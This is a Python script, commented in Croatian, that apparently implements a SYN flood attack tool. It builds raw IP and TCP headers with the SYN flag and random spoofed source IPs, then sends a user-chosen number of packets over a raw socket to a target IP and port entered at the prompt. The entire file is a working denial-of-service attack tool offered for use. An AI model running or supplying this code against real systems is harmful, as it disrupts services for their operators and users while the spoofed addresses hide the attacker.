import socket
import random
import struct


def checksum(data):
    # Postavi duljinu bajtova podataka na parni broj
    if len(data) % 2 == 1:
        data += b'\x00'
    # Zbroji sve bajtove podataka i prikaži kao jedan bajt
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    # Zbroji sve dok je suma veca od dva bajta
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    # Vrati halfword komplement sume
    return ~s & 0xffff


# Stvori IP zaglavlje 
def create_ip_header(source_ip, target_ip):
    version_ihl = (4 << 4) + 5
    type_of_service = 0
    total_length = 40 # (20 + 20)
    identification = random.randint(1, 65535)
    flags_offset = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    header_checksum = 0
    source_ip = socket.inet_aton(source_ip)
    target_ip = socket.inet_aton(target_ip)

    # Zapakiraj sve u big-endian poretku
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        type_of_service,
        total_length,
        identification,
        flags_offset,
        ttl,
        protocol,
        header_checksum,
        source_ip,
        target_ip,
    )

    return ip_header[:10] + struct.pack("!H", checksum(ip_header)) + ip_header[12:]


# Stvori TCP zaglavlje 
def create_tcp_header(source_ip, target_ip, target_port):
    source_port = random.randint(1024, 65535)
    seq_number = random.randint(0, 4294967295)
    ack_number = 0
    # 5 rijeci, 0x02 postavlja SYN bit u flag dijelu
    data_offset_flags = (5 << 12) | 0x02
    window_size = socket.htons(65535)
    checksum_placeholder = 0
    urgent_pointer = 0

    # Pomocno zaglavlje za izracun check sume
    pom_header = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(source_ip),
        socket.inet_aton(target_ip),
        0,
        socket.IPPROTO_TCP,
        20,
    )

    # Zapakiraj sve u big-endian poretku
    tcp_header = struct.pack(
        "!HHLLHHHH",
        source_port,
        target_port,
        seq_number,
        ack_number,
        data_offset_flags,
        window_size,
        checksum_placeholder,
        urgent_pointer,
    )

    return tcp_header[:16] + struct.pack("!H", checksum(pom_header + tcp_header)) + tcp_header[18:]


def create_syn_packet(source_ip, target_ip, target_port):
    ip_header = create_ip_header(source_ip, target_ip)
    tcp_header = create_tcp_header(source_ip, target_ip, target_port)
    return ip_header + tcp_header

# Glavna funkcija za napad
def syn_flood(target_ip, target_port, packet_count):
    # Kreiraj raw socket za IPv4
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except Exception as e:
        print(f"Socket nije kreiran: {e}")
        return

    for i in range(packet_count):
        source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        packet = create_syn_packet(source_ip, target_ip, target_port)
        sock.sendto(packet, (target_ip, 0))
        print(f"Sent packet {i + 1}/{packet_count}")

    print(f"Poslano {packet_count} SYN paketa na {target_ip}:{target_port}.")


if __name__ == "__main__":
    target_ip = input("Unesi IP adresu mete > ").strip()
    target_port = int(input("Unesi port mete > ").strip())
    packet_count = int(input("Unesi broj paketa >  ").strip())

    syn_flood(target_ip, target_port, packet_count)
